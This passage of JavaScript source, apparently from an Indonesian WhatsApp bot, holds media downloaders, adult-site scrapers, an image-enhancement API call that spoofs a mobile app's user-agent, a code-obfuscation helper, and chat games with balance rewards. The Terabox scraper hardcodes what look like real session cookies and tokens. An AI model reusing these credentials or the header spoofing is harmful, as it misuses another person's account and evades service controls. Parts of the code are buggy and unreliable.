}
async function processing(urlPath, method) {
	return new Promise(async (resolve, reject) => {
		let Methods = ["enhance", "recolor", "dehaze"];
		Methods.includes(method) ? (method = method) : (method = Methods[0]);
		let buffer,
			Form = new FormData(),
			scheme = "https" + "://" + "inferenceengine" + ".vyro" + ".ai/" + method;
		Form.append("model_version", 1, {
			"Content-Transfer-Encoding": "binary",
			contentType: "multipart/form-data; charset=uttf-8",
		});
		Form.append("image", Buffer.from(urlPath), {
			filename: "enhance_image_body.jpg",
			contentType: "image/jpeg",
		});
		Form.submit(
			{
				url: scheme,
				host: "inferenceengine" + ".vyro" + ".ai",
				path: "/" + method,
				protocol: "https:",
				headers: {
					"User-Agent": "okhttp/4.9.3",
					Connection: "Keep-Alive",
					"Accept-Encoding": "gzip",
				},
			},
			function (err, res) {
				if (err) reject();
				let data = [];
				res
					.on("data", function (chunk, resp) {
						data.push(chunk);
					})
					.on("end", () => {
						resolve(Buffer.concat(data));
					});
				res.on("error", (e) => {
					reject();
				});
			}
		);
	})
}



// FUNCTION SIZE FILE
const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}


async function getGcName(groupID) {
try {
let data_name = await alice.groupMetadata(groupID)
return data_name.subject
} catch (err) {
return '-'
}
}

// FUNCTION DOWNLOAD MP3 YTB
async function downloadMp3(url) {
try {
// jalur sampah
let mp3File = './.npm/'+getRandom('.mp3')
ytdl(url, {filter: 'audioonly'}).pipe(fs.createWriteStream(mp3File)).on('finish', async() => {
await alice.sendMessage(from, {audio: fs.readFileSync(mp3File), mimetype: 'audio/mpeg'}, {quoted:m})
fs.unlinkSync(mp3File)
})
} catch(e) {
console.log(e)
return alice.sendteks(from, util.format(e), m)
}
}

// FUNCTION DOWNLOAD MP4 YUTUB
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await haikal.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

// FUNCTION DOWNLOAD HENTAI SFM
async function hentaivid() {
return new Promise((resolve, reject) => {
const page = Math.floor(Math.random() * 1153)
axios.get('https://sfmcompile.club/page/'+page)
.then((data) => {
const $ = cheerio.load(data.data)
const hasil2 = []
$('#primary > div > div > ul > li > article').each(function (a, b) {
hasil2.push({
title: $(b).find('header > h2').text(),
link: $(b).find('header > h2 > a').attr('href'),
category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
type: $(b).find('source').attr('type') || 'image/jpeg',
video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
video_2: $(b).find('video > a').attr('href') || ''
})
})
resolve(hasil2)
})
})
}





// AUTO DOWNLOAD YOUTUBE SCRAPER
if (global.autodonlod && !m.key.fromMe)
if (budy.match(`youtube.com|youtu.be`)) {
let lodingdonlod = `*[ Loaded ]* downloaded from the link`
const alicevido = require('./lib/ytdl2')
const vido=await alicevido.mp4(budy)
downloadMp3(budy)
const autod=`*Tittle:* ${vido.title}\n*Date:* ${vido.date}\n*Duration:* ${vido.duration}\n*Quality:* ${vido.quality}`
await alice.sendMessage(m.chat,{ video: {url:vido.videoUrl}, caption: autod },{quoted:m})
}
// AUTO DOWNLOAD TIKTOK SCRAPER
if (global.autodonlod && !m.key.fromMe)
if (budy.match(`tiktok.com`)){
reply('memuat..')
TikTok(budy).then(async resi => {
let taev = `Title : ${resi.title}
Author : ${resi.author}`
await await alice.sendMessage(from, {video: {url: resi.nowm}, caption: taev})
}) // pengalih isu
}























































async function terabox(urls) {
    return new Promise(async (resolve, reject) => {
      const req = await axios.get(urls, {
      	headers: {
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
  Connection: "keep-alive",
  Cookie: "csrfToken=x0h2WkCSJZZ_ncegDtpABKzt; browserid=Bx3OwxDFKx7eOi8np2AQo2HhlYs5Ww9S8GDf6Bg0q8MTw7cl_3hv7LEcgzk=; lang=en; TSID=pdZVCjBvomsN0LnvT407VJiaJZlfHlVy; __bid_n=187fc5b9ec480cfe574207; ndus=Y-ZNVKxteHuixZLS-xPAQRmqh5zukWbTHVjen34w; __stripe_mid=895ddb1a-fe7d-43fa-a124-406268fe0d0c36e2ae; ndut_fmt=FF870BBFA15F9038B3A39F5DDDF1188864768A8E63DC6AEC54785FCD371BB182",
  DNT: "1",
  Host: "www.4funbox.com",
  "Sec-Fetch-Dest": "document",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-Site": "none",
  "Sec-Fetch-User": "?1",
  "Upgrade-Insecure-Requests": "1",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
  "sec-ch-ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"Windows"',
}, 
      	withCredentials: true 
      });
      const responseData = req.data;

      const jsToken = findBetween(responseData, "fn%28%22", "%22%29");
      const logid = findBetween(responseData, "dp-logid=", "&");
      if (!jsToken || !logid) {
        return resolve({ error: "Invalid jsToken, logid" });
      }

      const { searchParams: requestUrl, href } = new URL(urls);
      if (!requestUrl.has("surl")) {
        return resolve({ error: "Missing data" });
      }
      const surl = requestUrl.get("surl");

      const params = {
        app_id: "250528",
        web: "1",
        channel: "dubox",
        clienttype: "0",
        jsToken: jsToken,
        dplogid: logid,
        page: "1",
        num: "20",
        order: "time",
        desc: "1",
        site_referer: href,
        shorturl: surl,
        root: "1",
      };

      const response = await axios.get("https://www.4funbox.com/share/list", {
        params,
        headers: {
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
  Connection: "keep-alive",
  Cookie: "csrfToken=x0h2WkCSJZZ_ncegDtpABKzt; browserid=Bx3OwxDFKx7eOi8np2AQo2HhlYs5Ww9S8GDf6Bg0q8MTw7cl_3hv7LEcgzk=; lang=en; TSID=pdZVCjBvomsN0LnvT407VJiaJZlfHlVy; __bid_n=187fc5b9ec480cfe574207; ndus=Y-ZNVKxteHuixZLS-xPAQRmqh5zukWbTHVjen34w; __stripe_mid=895ddb1a-fe7d-43fa-a124-406268fe0d0c36e2ae; ndut_fmt=FF870BBFA15F9038B3A39F5DDDF1188864768A8E63DC6AEC54785FCD371BB182",
  DNT: "1",
  Host: "www.4funbox.com",
  "Sec-Fetch-Dest": "document",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-Site": "none",
  "Sec-Fetch-User": "?1",
  "Upgrade-Insecure-Requests": "1",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
  "sec-ch-ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"Windows"',
},
        withCredentials: true,
      });
      const responseData2 = response.data;
      if ((!"list") in responseData2) {
        resolve({ error: "Invalid response" });
      }
      resolve(responseData2?.list[0]);
    });
  };

// FUNCTION OBFUSCATOR DARWIN
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}


// FUNCTION PORNHUB
async function searchVideo(query) {
  const url = `https://www.pornhub.com/video/search?search=${query}`;
  const response = await fetch(url);
  const html = await response.text();
  const $ = cheerio.load(html);
  
  const videoList = [];

  $('li[data-video-segment]').each((index, element) => {
    const $element = $(element);
    
    const link = $element.find('.title a').attr('href').trim();
    const title = $element.find('.title a').text().trim();
    const uploader = $element.find('.videoUploaderBlock a').text().trim();
    const views = $element.find('.views').text().trim();
    const duration = $element.find('.duration').text().trim();
    
    const videoData = {
      link: "https://www.pornhub.com" + link,
      title: title,
      uploader: uploader,
      views: views,
      duration: duration
    };
    
    videoList.push(videoData);
  });
  
  return videoList;
}

async function searchGif(query) {
  const url = `http://www.pornhub.com/gifs/search?search=${query}`;
  const response = await fetch(url);
  const html = await response.text();
  const $ = cheerio.load(html);
  
  const gifs = $('ul.gifs.gifLink li');

    return gifs.map((i, gif) => {
      const data = $(gif).find('a');

      return {
        title: data.find('span').text(),
        url: 'http://dl.phncdn.com#id#.gif'.replace('#id#', data.attr('href')),
        webm: data.find('video').attr('data-webm'),
      };
    }).get();
}



// FUNCTION HENTAI SEARCH
async function searchHentai(search) {
  return new Promise((resolve, reject) => {
    axios.get("https://hentai.tv/?s=" + search).then(async ({ data }) => {
      let $ = cheerio.load(data)
      let result = {}
      let res = []
      result.coder = 'rem-comp'
      result.result = res
      result.warning = "It is strictly forbidden to reupload this code, copyright © 2022 by rem-comp"

      $('div.flex > div.crsl-slde').each(function (a, b) {
        let _thumbnail = $(b).find('img').attr('src')
        let _title = $(b).find('a').text().trim()
        let _views = $(b).find('p').text().trim()
        let _url = $(b).find('a').attr('href')
        let hasil = { thumbnail: _thumbnail, title: _title, views: _views, url: _url }
        res.push(hasil)
      })

      resolve(result)
    }).catch(err => {
      console.log(err)
    })
  })
}





function animediff(prompt) {
return new Promise(async(resolve, reject) => {	
let result = {}
let send_has_payload = {
  "fn_index": 3,
  "session_hash": "pk3us66nsyr"
}
let send_data_payload = {
  "data": [
    prompt,
    "",
    7.6,
    "Anime"
  ],
  "event_data": null,
  "fn_index": 3,
  "session_hash": "pk3us66nsyr"
}

    const ws = new WebSocket(wss);
    ws.onopen = function() {
     console.log("Connected to websocket")
    };

    ws.onmessage = async function(event) {
      let message = JSON.parse(event.data);

      switch (message.msg) {
        case 'send_hash':
          ws.send(JSON.stringify(send_has_payload));
          break;

        case 'estimation':
          console.log('Menunggu antrean: ️' + message.rank)
          break;

        case 'send_data':
          console.log('Processing your image....');        
          ws.send(JSON.stringify(send_data_payload));
          break;
        case 'process_completed':        
          result.image1 = message.output.data[0][0].replace( 'data:image/jpeg;base64,', '')
          result.image2 = message.output.data[0][1].replace( 'data:image/jpeg;base64,', '')
          result.image3 = message.output.data[0][2].replace( 'data:image/jpeg;base64,', '')
          result.image4 = message.output.data[0][3].replace( 'data:image/jpeg;base64,', '')
          break;
      }
    };

    ws.onclose = function(event) {
      if (event.code === 1000) {
        console.log('Process completed️');
      } else {
        msg.reply('Err : WebSocket Connection Error:\n');
      }
      resolve(result)
    };
  })
}
    
    
    
// FUNCTION AFK BY DARWIN
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`${tag} sedang *Afk* ${reason ? 'karena ' + reason : 'tanpa alasan'} selama *${clockString(new Date - afkTime)}*
`.trim())
}
if (global.db.users[sender].afkTime > -1) {
let user = global.db.users[sender]
reply(`${tag} telah kembali dari *Afk* ${user.afkReason ? 'setelah ' + user.afkReason : ''}\nselama *${clockString(new Date - user.afkTime)}*`.trim())
user.afkTime = -1
user.afkReason = ''
}
    
    
    
// FUNCTION TICTACTOE BY DARWIN
const isTicTacToe = (from, _dir) => {
let status = false
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
status = true
}
})
return status
}

const getPosTic = (from, _dir) => {
let position = null
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
position = i
}
})
if (position !== null) {
return position
}
}

const KeisiSemua = (tic) => {
let status = true
for (let i of tic){
if (i !== '❌' && i !== '⭕'){
status = false
}
}
return status
}

const cekIsi = (nomor, tic) => {
let status = false
if (tic[nomor] === '❌' || tic[nomor] === '⭕'){
status = true
}
return status
}

const cekTicTac = (tic) => {
let status = false
if (tic[0] === '❌' && tic[1] === '❌' && tic[2] === '❌' || tic[0] === '⭕' && tic[1]=== '⭕' && tic[2] === '⭕'){
status = true
} else if (tic[3] === '❌' && tic[4] === '❌' && tic[5] === '❌' || tic[3] === '⭕' && tic[4] === '⭕' && tic[5] === '⭕'){
status = true
} else if (tic[6] === '❌' && tic[7] === '❌' && tic[8] === '❌' || tic[6] === '⭕' && tic[7] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[3] === '❌' && tic[6] === '❌' || tic[0] === '⭕' && tic[3] === '⭕' && tic[6] === '⭕'){
status = true
} else if (tic[1] === '❌' && tic[4] === '❌' && tic[7] === '❌' || tic[1] === '⭕' && tic[4] === '⭕' && tic[7] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[5] === '❌' && tic[8] === '❌' || tic[2] === '⭕' && tic[5] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[4] === '❌' && tic[8] === '❌' || tic[0] === '⭕' && tic[4] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[4] === '❌' && tic[6] === '❌' || tic[2] === '⭕' && tic[4] === '⭕' && tic[6] === '⭕'){
status = true
}
return status 
}

if (isTicTacToe(from, tictactoe)) {
try {
// TicTacToe
if (isTicTacToe(from, tictactoe)){
let nomor = [1, 2, 3, 4, 5, 6, 7, 8, 9]
let posi = tictactoe[from]
let anu = posi.TicTacToe
if (posi.status === null){
if (sender === posi.ditantang){
if (body.toLowerCase() === 'y'){
the = `@${posi.ditantang.split('@')[0]} menerima tantangan

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
alice.sendteks(from, the, m)

tictactoe[from].status = true
} else if (body.toLowerCase() === 'n'){
users[m.sender].balance -= 1000
the1 = `@${posi.ditantang.split('@')[0]} menolak, game dibatalkan\nDan Player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
alice.sendteks(from, the1, m)
delete tictactoe[from];
}
}
} else if (posi.status === true){
if (sender === posi.penantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return m.reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '❌'
if (cekTicTac(tictactoe[from].TicTacToe)){
the2 = `@${posi.penantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
alice.sendteks(from, the2, m)
users[posi.penantang].balance += posi.hadiah
users[posi.ditantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the3 = `*HASIL SERI*

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
alice.sendteks(from, the3, m)

delete tictactoe[from];
} else {
the4 = `@${posi.penantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.ditantang.split('@')[0]}`
alice.sendteks(from, the4, m)

tictactoe[from].status = false
}
}
}
}
} else if (posi.status === false){
if (sender === posi.ditantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return m.reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '⭕' 
if (cekTicTac(anu)){
the5 = `@${posi.ditantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
alice.sendteks(from, the5, m)
users[posi.ditantang].balance += posi.hadiah
users[posi.penantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the6 = `Hasil Seri

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
alice.sendteks(from, the6, m)

delete tictactoe[from];
} else {
the7 = `@${posi.ditantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
alice.sendteks(from, the7, m)

tictactoe[from].status = true
}
}
}
}
}
}
} catch (err){
console.log(chalk.redBright('[ ERROR TICTACTOE ]'), err)
}
}

// FUNCTION SUIT PVP POLLING BY DARWIN
let roof = Object.values(suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(sender))
if (roof) {
let win = ''
let tie = false
if (sender == roof.p2 && /^(acc(ept)?|y|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(body) && m.isGroup && roof.status == 'wait') {
if (/^(gamau|nanti|ga(k.)?bisa)/i.test(body)) {
minSaldo(m.sender, 1000, db_saldo)
pokl = `@${roof.p2.split('@')[0]} menolak suit, suit dibatalkan\nDan player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
await alice.sendteks(from, pokl, m)
delete suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)

teksbbb = `AYO PILIH SUIT MU`
ggy = `Suit telah dikirimkan ke chat

@${roof.p.split('@')[0]} dan @${roof.p2.split('@')[0]}

Silahkan pilih suit di chat masing"
klik wa.me/${botNumber.split('@')[0]}`
await alice.sendteks(from, ggy, fkontak2)
if (!roof.pilih) await alice.sendPoll(roof.p, teksbbb, [`batu`,`kertas`,`gunting`, ])
if (!roof.pilih2) await alice.sendPoll(roof.p2, teksbbb, [`batu`,`kertas`,`gunting`, ])
roof.waktu_milih = setTimeout(async() => {
if (!roof.pilih && !roof.pilih2) await alice.sendMessage(from, {text: `Kedua pemain tidak niat main,\nSuit dibatalkan`})
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
minSaldo(m.sender, 1000, db_saldo)
sffp = `@${(roof.pilih ? roof.p2 : roof.p).split('@')[0]} tidak memilih suit, game berakhir\nDan Player dikenakan sanksi pengurangan Rp. 1,000 saldo karna menolak ajakan pemain`
await reply795(sffp)
}
delete suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = sender == roof.p
let jwb2 = sender == roof.p2
let g = /.gunting/i
let b = /.batu/i
let k = /.kertas/i
let reg = /^(.gunting|.batu|.kertas)/i
if (jwb && reg.test(body) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(body.toLowerCase())[0]
roof.text = body
await alice.sendMessage(from, {text: `Kamu telah memilih ${body} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`}, {quoted:fkontak2})
if (!roof.pilih2) await alice.sendMessage(roof.p2, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
if (jwb2 && reg.test(body) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(body.toLowerCase())[0]
roof.text2 = body

tyu = `Kamu telah memilih ${body} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`
await alice.sendMessage(from, {text: tyu}, {quoted:m})

if (!roof.pilih) await alice.sendMessage(roof.p, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
await alice.sendteks(roof.asal, `${tie ? '*HASIL SERI*\n\n' : ''}@${roof.p.split('@')[0]} *${roof.text}* ${tie ? '' : roof.p == win ? ' Menang' : ' Kalah'}\n@${roof.p2.split('@')[0]} *${roof.text2}* ${tie ? '' : roof.p2 == win ? ' Menang' : ' Kalah'}${tie ? '' : '\n\nHadiah Saldo : 2,000 '}`, f1('HASIL SUIT PVP', null))
if (roof.p == win) {
roof.p == win ? minSaldo(users[roof.p], 2000, db_saldo) : minSaldo(users[roof.p], 1000, db_saldo)
} else if (roof.p2 == win) {
roof.p2 == win ? addSaldo(users[roof.p2], 2000, db_saldo) : minSaldo(users[roof.p2], 1000, db_saldo)
}
delete suit[roof.id]
}
}


// FUNCTION PETAK BOMB BY DARWIN
let pilih = "🌀", bomb = "💣";
if (sender in petakbom) {
if (!/^[1-9]|10$/i.test(body) && !isCmd) return !0;
if (petakbom[sender].petak[parseInt(body) - 1] === 1) return !0;
if (petakbom[sender].petak[parseInt(body) - 1] === 2) {
petakbom[sender].board[parseInt(body) - 1] = bomb;
petakbom[sender].pick++;
alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
petakbom[sender].bomb--;
petakbom[sender].nyawa.pop();

let brd = petakbom[sender].board;
if (petakbom[sender].nyawa.length < 1) {
await reply795(`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n ${brd.join("")}\n\n*Terpilih :* ${petakbom[sender].pick}\n*Pengurangan Saldo :* Rp. 100`);
alice.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
minSaldo(sender, 100, db_saldo)
delete petakbom[sender];
} else await m.reply(`*PILIH ANGKA*\n\nKamu terkena bomb\n ${brd.join("")}\n\nTerpilih: ${petakbom[sender].pick}\nSisa nyawa: ${petakbom[sender].nyawa}`);
return !0;
}
if (petakbom[sender].petak[parseInt(body) - 1] === 0) {
petakbom[sender].petak[parseInt(body) - 1] = 1;
petakbom[sender].board[parseInt(body) - 1] = pilih;
petakbom[sender].pick++;
petakbom[sender].lolos--;
let brd = petakbom[sender].board;
if (petakbom[sender].lolos < 1) {
await reply795(`*KAMU HEBAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join("")}\n\n*Terpilih :* ${petakbom[sender].pick}\n*Sisa nyawa :* ${petakbom[sender].nyawa}\n*Bomb :* ${petakbom[sender].bomb}\n*Hadiah Saldo :* Rp. 250`);
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
addSaldo(m.sender, 250, db_saldo)
delete petakbom[sender];
} else m.reply(`*PILIH ANGKA*\n\n${brd.join("")}\n\nTerpilih : ${petakbom[sender].pick}\nSisa nyawa : ${petakbom[sender].nyawa}\nBomb : ${petakbom[sender].bomb}`)
}
}

// GAME TEBAK GAMBAR BY DARWIN

if ((from in tebakgambar)) {
let { soal, jawaban, hadiah, waktu } = tebakgambar[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${tebakgambar[from].jawaban}*`);
delete tebakgambar[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 150`);
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
addSaldo(m.sender, 150, db_saldo)
clearTimeout(waktu);
delete tebakgambar[from];
} else alice.sendMessage(sender, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK ANIME BY DARWIN
if ((from in tebakanime)) {
let { soal, jawaban, hadiah, waktu } = tebakanime[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakanime[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebakanime[from];
} else alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK LAGU BY DARWIN
if ((from in tebaklagu)) {
let { soal, jawaban, hadiah, waktu } = tebaklagu[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebaklagu[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete tebaklagu[from];
} else alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME KUIS BY DARWIN
if ((from in kuis)) {
let { soal, jawaban, hadiah, waktu } = kuis[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete kuis[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete kuis[from];
} else alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME SIAPAKAH AKU BY DARWIN
if ((from in siapakahaku)) {
let { soal, jawaban, hadiah, waktu } = siapakahaku[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete siapakahaku[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})

clearTimeout(waktu);
delete siapakahaku[from];
} else alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KALIMAT BY DARWIN
if ((from in tebakkalimat)) {
let { soal, jawaban, hadiah, waktu } = tebakkalimat[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkalimat[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
clearTimeout(waktu);
delete tebakkalimat[from];
} else alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KATA BY DARWIN
if ((from in tebakkata)) {
let { soal, jawaban, hadiah, waktu } = tebakkata[from]
if (budy.toLowerCase() == "nyerah") {
reply795(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkata[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await reply795(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n\n*Game :* Tebak Kata\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
alice.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
clearTimeout(waktu);
delete tebakkata[from];
} else await alice.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

